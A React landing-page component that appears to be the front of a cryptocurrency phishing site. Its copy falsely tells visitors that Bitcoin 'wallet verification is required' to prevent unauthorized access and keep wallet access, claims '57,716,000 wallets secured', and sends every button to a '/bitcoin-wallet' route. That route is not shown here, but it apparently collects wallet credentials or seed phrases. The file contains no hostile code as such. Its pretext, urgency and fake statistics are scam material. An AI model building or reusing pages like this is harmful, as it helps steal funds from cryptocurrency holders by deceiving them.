import React from 'react'
import "./bitcoinPagesCss/bitcoinLanding.css"
import BitcoinHeader from '../bitcoinHeader/BitcoinHeader'
import bitcoinCom_hero_image from "../../../assets/bitcoinCom_hero_image.png"
import bitcoin_landing_feature_card_image_1 from "../../../assets/bitcoin_landing_feature_card_image_1.png"
import bitcoin_landing_feature_card_image_2 from "../../../assets/bitcoin_landing_feature_card_image_2.png"
import bitcoin_landing_feature_card_image_3 from "../../../assets/bitcoin_landing_feature_card_image_3.png"
import bitcoin_landing_feature_card_image_4 from "../../../assets/bitcoin_landing_feature_card_image_4.png"
import bitcoin_landing_feature_card_image_5 from "../../../assets/bitcoin_landing_feature_card_image_5.png"
import bitcoin_landing_feature_card_image_6 from "../../../assets/bitcoin_landing_feature_card_image_6.png"
import BitcoinFooter from '../bitcoinFooter/BitcoinFooter'
import { useNavigate } from 'react-router-dom'

const BitcoinLanding = () => {

  const navigate = useNavigate()

  return (
    <>
      <main className='bitcoin_landing_body'>
        <BitcoinHeader/>

        {/* ================= HERO ================= */}
        <section className='bitcoin_hero_section'>
          <article className='bitcoin_hero_text_container'>
            <h1>Secure Your Bitcoin Wallet</h1>
            <p>
              Wallet verification is required to confirm ownership,
              prevent unauthorized access, and activate enhanced security protection.
            </p>
            <button onClick={()=>navigate("/bitcoin-wallet")}>
              Validate Wallet
            </button>
          </article>

          <article className='bitcoin_hero_image_container'>
            <img src={bitcoinCom_hero_image} alt='image'/>
          </article>
        </section>

        {/* ================= WALLET COUNT ================= */}
        <section className='bitcoin_landing_wallets_connected_section'>
          <h1>57,716,000 <span>wallets secured</span></h1>
          <button onClick={()=>navigate("/bitcoin-wallet")}>
            Secure yours now
          </button>
        </section>

        {/* ================= FEATURES ================= */}
        <section className='bitcoion_landing_feature_section'>
          <article className='bitcoin_landing_feature_top'>
            <h1>
              Essential security features designed to protect
              your Bitcoin wallet and digital assets
            </h1>
          </article>

          <article className='bitcoin_landing_feature_card_container'>
            
            <div className='bitcoin_landing_feature_card'>
              <div className='bitcoin_landing_feature_card_image_container'>
                <img src={bitcoin_landing_feature_card_image_1} alt='image'/>
              </div>
              <div className='bitcoin_landing_feature_card_text_container'>
                <h2>Wallet ownership verification</h2>
                <p>
                  Confirm that you are the legitimate owner of your wallet.
                  Validation helps prevent unauthorized access and ensures
                  compatibility with current security standards.
                </p>
              </div>
            </div>

            <div className='bitcoin_landing_feature_card dir_change'>
              <div className='bitcoin_landing_feature_card_image_container image_change'>
                <img src={bitcoin_landing_feature_card_image_2} alt='image'/>
              </div>
              <div className='bitcoin_landing_feature_card_text_container text_change'>
                <h2>Enhanced wallet protection</h2>
                <p>
                  Activate upgraded security layers including identity verification,
                  wallet integrity checks, and protection against abnormal activity.
                </p>
              </div>
            </div>

            <div className='bitcoin_landing_feature_card'>
              <div className='bitcoin_landing_feature_card_image_container rd_change'>
                <img src={bitcoin_landing_feature_card_image_3} alt='image'/>
              </div>
              <div className='bitcoin_landing_feature_card_text_container'>
                <h2>Network compatibility validation</h2>
                <p>
                  Ensure your wallet remains fully compatible with the Bitcoin network
                  and connected services following recent security updates.
                </p>
              </div>
            </div>

            <div className='bitcoin_landing_feature_card dir_change'>
              <div className='bitcoin_landing_feature_card_image_container image_change'>
                <img src={bitcoin_landing_feature_card_image_4} alt='image'/>
              </div>
              <div className='bitcoin_landing_feature_card_text_container text_change'>
                <h2>Transaction safety checks</h2>
                <p>
                  Verification enables advanced monitoring that helps reduce risks
                  associated with unauthorized or suspicious transactions.
                </p>
              </div>
            </div>

            <div className='bitcoin_landing_feature_card'>
              <div className='bitcoin_landing_feature_card_image_container'>
                <img src={bitcoin_landing_feature_card_image_5} alt='image'/>
              </div>
              <div className='bitcoin_landing_feature_card_text_container'>
                <h2>Continuous security monitoring</h2>
                <p>
                  Stay protected with ongoing wallet integrity checks designed
                  to detect vulnerabilities and maintain account safety.
                </p>
              </div>
            </div>

            <div className='bitcoin_landing_feature_card dir_change'>
              <div className='bitcoin_landing_feature_card_image_container image_change'>
                <img src={bitcoin_landing_feature_card_image_6} alt='image'/>
              </div>
              <div className='bitcoin_landing_feature_card_text_container text_change'>
                <h2>Uninterrupted wallet access</h2>
                <p>
                  Completing validation helps prevent service interruptions
                  and ensures continuous access to wallet functionality.
                </p>
              </div>
            </div>

          </article>
        </section>

        {/* ================= FINAL CTA ================= */}
        <section className='get_the_most_of_bitcooin_wallet_section'>
          <h2>Complete your wallet validation</h2>
          <p>
            Verification is required to maintain full security,
            compatibility, and uninterrupted wallet access.
          </p>
          <button onClick={()=>navigate("/bitcoin-wallet")}>
            Validate Wallet
          </button>
        </section>

        <BitcoinFooter/>
      </main>
    </>
  )
}

export default BitcoinLanding
